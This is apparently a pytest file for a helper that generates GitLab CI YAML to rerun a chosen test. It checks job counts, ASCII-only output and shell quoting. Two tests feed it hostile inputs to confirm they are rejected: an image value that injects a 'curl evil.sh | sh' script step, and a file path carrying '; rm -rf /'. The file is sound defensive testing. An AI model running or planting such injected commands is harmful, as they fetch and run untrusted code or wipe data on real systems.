import pytest

from app.services.validation.ci_yaml import generate_ci_yaml


def test_generates_n_sequential_jobs():
    y = generate_ci_yaml(file_path="tests/test_x.py", test_name="test_y",
                         runs=5, image="python:3.12-slim")
    assert y.count("\n  stage: verify") == 5
    assert y.count("needs:") == 4              
    assert "cache: {}" in y                  



def test_yaml_is_pure_ascii():
    # An em-dash (U+2014) or other non-ASCII char in the generated .gitlab-ci.yml
    # broke YAML parsing on gitlab.com (pipeline status 'error'). The generated
    # config must stay pure ASCII so it parses everywhere.
    y = generate_ci_yaml(file_path="tests/test_x.py", test_name="test_y",
                         runs=5, image="python:3.12-slim")
    assert y.isascii(), "generated CI YAML must be pure ASCII"


def test_rejects_yaml_injection_in_image():
    # A newline in the image would let an attacker inject arbitrary YAML keys/jobs.
    with pytest.raises(ValueError):
        generate_ci_yaml(file_path="tests/test_x.py", test_name="test_y", runs=1,
                         image="python:3.12\n  script:\n    - curl evil.sh | sh")


def test_rejects_injection_in_path():
    with pytest.raises(ValueError):
        generate_ci_yaml(file_path="tests/x.py; rm -rf /", test_name="t",
                         runs=5, image="python:3.12-slim")




def test_runs_specific_test_node_id():
    # Verify the specific failing test by node id (file::test), shell-quoted.
    y = generate_ci_yaml(file_path="tests/test_x.py", test_name="test_y",
                         runs=1, image="python:3.12-slim")
    assert "pytest tests/test_x.py::test_y -p no:cacheprovider -q" in y


def test_param_node_id_is_shell_quoted():
    # Parametrized node ids contain [ ] (shell-glob chars) — must be quoted.
    y = generate_ci_yaml(file_path="tests/test_x.py", test_name="test_y[case-1]",
                         runs=1, image="python:3.12-slim")
    assert "pytest 'tests/test_x.py::test_y[case-1]'" in y